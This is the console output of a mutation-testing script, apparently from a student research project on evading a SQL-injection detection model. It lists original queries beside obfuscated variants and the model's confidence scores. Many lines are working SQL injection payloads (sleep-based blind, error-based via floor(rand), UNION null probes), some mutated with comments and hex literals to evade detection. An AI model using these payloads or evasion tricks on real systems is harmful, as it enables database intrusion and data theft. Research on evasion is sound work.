@@ -1,0 +1,138 @@
+C:\Users\caffr\Desktop\nyu\project\sql_llm\venv\Scripts\python.exe C:\Users\caffr\Desktop\nyu\project\sql_llm\mutation_test.py 
+2023-12-07 14:52:48.798636: I tensorflow/core/util/port.cc:113] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
+WARNING:tensorflow:From C:\Users\caffr\Desktop\nyu\project\sql_llm\venv\Lib\site-packages\keras\src\losses.py:2976: The name tf.losses.sparse_softmax_cross_entropy is deprecated. Please use tf.compat.v1.losses.sparse_softmax_cross_entropy instead.
+
+  0%|          | 0/3092 [00:00<?, ?it/s]SELECT * FROM border WHERE gift IN  ( SELECT giving FROM own ) 
+[!] Max number of iterations reached
+Reached confidence 0.5256045460700989
+with payload
+SELECT @* FROM/*..Q	0x4*/border/*8L]*/WHERE/*0x1fc*/gift IN/*d"	*/ (/**/SELECT/*y-*/givingFROMown/*c){f*/) 
+ round left -7
+  0%|          | 1/3092 [02:13<114:34:01, 133.43s/it]SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1
+[!] Max number of iterations reached
+Reached confidence 0.5060045123100281
+with payload
+SELECT/*(SELECT (SELECT 11)) AND "s)qj" LIKE "s)qj" AND (SELECT 1)#t>(Y50*/option_value/**/FROM/**/wp_options/*+S|=_TE/*/WHERE/*%N*/option_name  LIKE  'zcf_captcha_settings' LIMIT/**/1%Yq
+ round left -2
+  0%|          | 2/3092 [04:34<118:20:56, 137.88s/it]SELECT * FROM outline  WHERE simplest NOT LIKE '[hill]%'
+[+] Threshold reached
+Reached confidence 0.49862512946128845
+with payload
+d. OR 0x22cf!=(SELECT (SELECT 8911)) AND 1/**/AND 1 OR 9183 NOT LIKE 9183 OR 6715 LIKE 6716#@*/* FROMoutline /**/WHERE simplest/**/NOT =/*a]*/'[hill]%'%p
+ round left 93
+  0%|          | 3/3092 [06:09<101:38:33, 118.46s/it]select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --
+[!] Max number of iterations reached
+Reached confidence 0.9827278256416321
+with payload
+select   (  case when   (  (SELECT 0x1fb1)  =  0x2315  )   then 0x1fb1 else (SELECT 1)/  (  select 0x0  )/**/  end  )/**//*L]e,-~+leY|eN`+-**/--G5`h
+ round left -10
+  0%|          | 4/3092 [07:58<98:14:02, 114.52s/it] 1%"  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  "%"  =  "
+[!] Max number of iterations reached
+Reached confidence 0.5202592015266418
+with payload
+1%"/*I5M[E*/ )   or elt  (  0x1880  = /**/(SELECT 0x1880),sleep  (  0x5   )   /*fQ@*/)/**/   and/*:o7*//* && True AND True#*/ ( /*-zZn*/"%"  = /**/"+
+kznLKi;
+ round left -13
+  0%|          | 5/3092 [10:16<105:30:43, 123.05s/it]SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort
+[!] Max number of iterations reached
+Reached confidence 0.5061721801757812
+with payload
+SELECT/**/kind/**/FROM/*H3{zj*/avoid/**/UNION SELECT/*T4zmx*/hurt/**/FROM/**/fastened/**//**/ OR /**/DER/**/BY/*X/:%'u AND 0x2367=9063 OR False#z*/fortCS
+ round left -16
+  0%|          | 6/3092 [12:31<108:58:53, 127.13s/it]SELECT AVG ( later )  FROM gray  SELECT SUM ( salmon ) 
+[!] Max number of iterations reached
+Reached confidence 0.5225325226783752
+with payload
+SELECT AVG ( later/*w5(1Pa*/) /*N	xETCX0H*
+V*/FROM/**/gray /**/SELECT SUM/**/( salmon	)/*T
+$@\*/
+ round left -22
+  0%|          | 7/3092 [14:16<102:48:48, 119.98s/it]1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'rdpv'  =  'rdpv
+[!] Max number of iterations reached
+Reached confidence 0.9960654377937317
+with payload
+1'   )  /*<,#*/ )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  0x23d5,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (/**/   (/*<< &qu>N2g*//*
+-U#)^teL'*/ 'rdpv'  LIKE  'rdpvEZkTi
+ round left -3
+  0%|          | 10/3092 [17:41<76:56:40, 89.88s/it] SELECT * FROM third WHERE    NOT habit = 'design'
+[!] Max number of iterations reached
+Reached confidence 0.5127376914024353
+with payload
+SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 1))))))=^l
+*/**/FROM/*y_:kN*/third/*cu,*/WHERE   /**/NOT habit LIKE/**/'design'
+ round left -11
+  0%|          | 12/3092 [19:29<65:49:23, 76.94s/it]  SELECT softlyID AS ID, understanding AS discussion FROM type
+[!] Max number of iterations reached
+Reached confidence 0.5084322094917297
+with payload
+/*(Hz2aAXwcm*/ SELECT
+softlyID AS/*F(S	2*/ID,/*R:R*/understanding AS/*<DdLu8c((l]K*/discussionFROM type
+ round left -21
+  0%|          | 14/3092 [21:11<58:17:30, 68.18s/it]1,iif  (  7475  =  7475,1,1/0  )  
+[!] Max number of iterations reached
+Reached confidence 0.9627447724342346
+with payload
+1,iif /*E*/(  0x1d33/*Dy;!*/ LIKE /**/7475,1,1/0x0 /*D{u{0eKNP\~*/)  
+ round left -19
+  1%|          | 16/3092 [22:52<53:25:27, 62.53s/it]SELECT * FROM immediately FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM together
+[!] Max number of iterations reached
+Reached confidence 0.5225439667701721
+with payload
+SELECT/*"g=	
+Pdwb?BFMQ*/ZDg>*/**/FROM/**/immediately FETCH FIRST 0x32 PERCENT/**/ROWS/**/ONLYSELECTTOP0x3 * FROM/*VM_|T/**/&(v*/together
+ round left -11
+  1%|          | 17/3092 [24:40<60:39:08, 71.01s/it]SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM beauty
+[!] Max number of iterations reached
+Reached confidence 0.5139875411987305
+with payload
+SELECT */*M~)"5z%fw\Pk?(h:xne*/FROM/**/master FETCH FIRST 0x3 ROWS/*q*/ONLY/**/SELECT TOP (SELECT/**/0x32) PERCENT/*v*/*/*@0x5*/FROM/*kK|Xk+=q^HWVD <*/beauty
+ round left -10
+  1%|          | 22/3092 [27:24<41:53:02, 49.11s/it]SELECT * FROM easier WHERE soon = 'hunt'  OR minerals = 'from'
+[!] Max number of iterations reached
+Reached confidence 0.5248059630393982
+with payload
+SELECT/*f_XKfR=Rw*/*/*faV OR 'm'='mc' OR '.Zh.' NOT LIKE '.Zh.' OR 0 AND4218=4218#;D_r*/FROM/**/easier/**/WHERE/*Ut]*/soon LIKE 'hunt' /**/ OR  minerals LIKE/**/'from'F{U$I+(|-I
+ round left -7
+  1%|          | 23/3092 [30:20<57:04:44, 66.95s/it]1"   )    )     )   union all select null,null,null--
+[!] Max number of iterations reached
+Reached confidence 0.9969379901885986
+with payload
+1"   )   )     )   unionall selectnull,null,null--
+ round left -3
+  1%|          | 24/3092 [31:54<60:57:35, 71.53s/it]-5182"   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #
+[!] Max number of iterations reached
+Reached confidence 0.9664375185966492
+with payload
+"*/)    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 0x1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )   AND "T1" NOT = "T1;" ORFalse OR False OR False AND True#w&WwpUN;ieDK
+ round left -3
+  1%|          | 25/3092 [35:04<80:28:20, 94.46s/it]SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5421 )  ORDER BY meta_id ASC
+[!] Max number of iterations reached
+Reached confidence 0.9732591509819031
+with payload
+SELECTpost_id, meta_key, meta_value FROM wp_postmetaWHEREpost_id IN  ( (SELECT 0x152d) )   OR DER/*S6egf.BCJC
+~3CRLFh>~f06m'Vdc|-1`|525 AND 65 LIKE 65#w*/BYmeta_id ASC`
+ round left -5
+  1%|          | 26/3092 [37:18<87:34:07, 102.82s/it]iif  (  6369  =  5881,1,1/0  )  
+[!] Max number of iterations reached
+Reached confidence 0.512365460395813
+with payload
+SEOFA{*//**/
+ round left -7
+  1%|          | 29/3092 [38:47<57:37:17, 67.72s/it] 1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  '
+[!] Max number of iterations reached
+Reached confidence 0.9948214292526245
+with payload
+1%' and /*0x0&0*/ (  select * from   (  select  (  sleep  (  (SELECT 0x5)/**/  ) /**/  )   /*.\(SELECT5)*/ )/**/ fzno  ) /*{{hu^i*/ and/**/'%'/*pRn5Em*/ LIKE  '
+ round left 0
+  1%|          | 30/3092 [40:59<67:50:00, 79.75s/it]SELECT * FROM scientist WHERE old NOT LIKE 'form%'
+[!] Max number of iterations reached
+Reached confidence 0.5174826979637146
+with payload
+SELECT/*]V)F*/*/***x*/FROM/**/scientistWHERE/**/old NOT/* AND 9448 IN (9447,9448,9449)#/5/vgB*/LIKE/*seJ\*/'form%'X
+ round left -8
+correct classify 20
+miss classify 3
+success rate 0.15
+  1%|          | 32/3092 [43:36<69:29:37, 81.76s/it]
+
+Process finished with exit code 0
